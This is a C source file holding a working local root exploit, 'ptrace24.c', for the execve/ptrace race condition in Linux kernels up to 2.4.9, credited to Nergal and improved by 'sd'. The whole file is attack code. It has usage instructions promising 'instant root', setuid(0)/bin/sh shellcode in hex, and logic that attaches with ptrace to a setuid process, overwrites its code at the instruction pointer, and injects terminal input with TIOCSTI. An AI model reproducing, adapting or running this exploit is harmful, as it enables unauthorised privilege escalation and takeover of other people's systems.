/*
	ptrace24.c [ improved by sd@ircnet ]
	~~~~~~~~~~
	exploit for execve/ptrace race condition in Linux kernel up to 2.4.9

	Originally by Nergal.
	Improved by sd.

	This sploit doesn't need offset in victim binary
	coz were using regs.eip instead (shellcode is non-self modifying)

	It should work on openwall-patched kernels (but not on
	Openwall GNU Linux as Nergal mentioned in advisory)
	
	Use:
		cc ptrace24.c -o ptrace24
		./ptrace24

	It gives instant root with any of: su, newgrp, screen [if +s]
	(assuming if no password requiered) just change #define TARGET.
	
	NOTE: This works only if it's executed on a tty [i.e. interactively].
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/ioctl.h>
#include <linux/user.h>
#include <limits.h>
#include <unistd.h>
#include <signal.h>
#include <wait.h>
#include <fcntl.h>

#define VICTIM	"/usr/bin/passwd"
#define TARGET  "/usr/bin/newgrp"

/* quite tricky shellcode, it doesn't need +W, so we can use it in .text */
/* setuid(0) + /bin/sh = 31 bytes*/
char sc[]=
	"\x6a\x17\x58\x31\xdb\xcd\x80\x31"
	"\xd2\x52\x68\x6e\x2f\x73\x68\x68"
	"\x2f\x2f\x62\x69\x89\xe3\x52\x53"
	"\x89\xe1\x8d\x42\x0b\xcd\x80";

void ex_passwd(int fd)
{
	char z;
	dup2(2, 1);
        if (read(fd, &z, 1) <= 0) {
        	perror("read:");
        	exit(1);
        }
        execl(VICTIM, VICTIM, 0);
        perror("execl");
        exit(1);
}

void insert(char *us, int pid)
{
        char buf[100];
        char *ptr = buf;
        sprintf(buf, "exec %s %i\n", us, pid);
        while (*ptr && !ioctl(0, TIOCSTI, ptr++));
}

int	insert_shellcode(int pid)
{
        int	i, wpid;
        struct	user_regs_struct regs;

        if (ptrace(PTRACE_GETREGS, pid, 0, &regs)) {
                perror("PTRACE_GETREGS");
                exit(0);
        }

        for (i = 0; i <= strlen(sc) + 1; i += 4)
                ptrace(PTRACE_POKETEXT, pid, regs.eip + i,
                    *(unsigned int *) (sc + i));

        if (ptrace(PTRACE_SETREGS, pid, 0, &regs))
                exit(0);

        if (ptrace(PTRACE_DETACH, pid, 0, 0))
                exit(0);

        close(2);
        do {
                wpid = waitpid(-1, NULL, 0);
                if (wpid == -1) {
                        perror("waitpid");
                        exit(1);
                }
        } while (wpid != pid);
	return 0;
}

int	main(int argc, char *argv[])
{
        int	res;
        int	pid, n;
        int	pipa[2];

	if ((argc == 2) && ((pid = atoi(argv[1])))) {
		return insert_shellcode(pid);
	}

        pipe(pipa);

        switch (pid = fork()) {
	        case -1:
	                perror("fork");
	                exit(1);
	        case 0:
	                close(pipa[1]);
	                ex_passwd(pipa[0]);
	        default:;
        }

        res = ptrace(PTRACE_ATTACH, pid, 0, 0);

        if (res) {
                perror("attach");
                exit(1);
        }

        res = waitpid(-1, NULL, 0);
        if (res == -1) {
                perror("waitpid");
                exit(1);
        }

        res = ptrace(PTRACE_CONT, pid, 0, 0);
        if (res) {
                perror("cont");
                exit(1);
        }

        fprintf(stderr, "attached\n");

        switch (fork()) {
	        case -1:
	                perror("fork");
	                exit(1);
	        case 0:
	                close(pipa[1]);
	                sleep(1);
	                insert(argv[0], pid);
	                do {
				char c;
	                        n = read(pipa[0], &c, 1);
	                } while (n > 0);
	                if (n < 0)
	                        perror("read");
	                exit(0);
	        default:;
	}
        close(pipa[0]);

        dup2(pipa[1], 2);
        close(pipa[1]);
        /* Decrystallizing reason */
        setenv("LD_DEBUG", "libs", 1);
        /* With strength I burn */
        execl(TARGET, TARGET, 0);
	return 1;
}
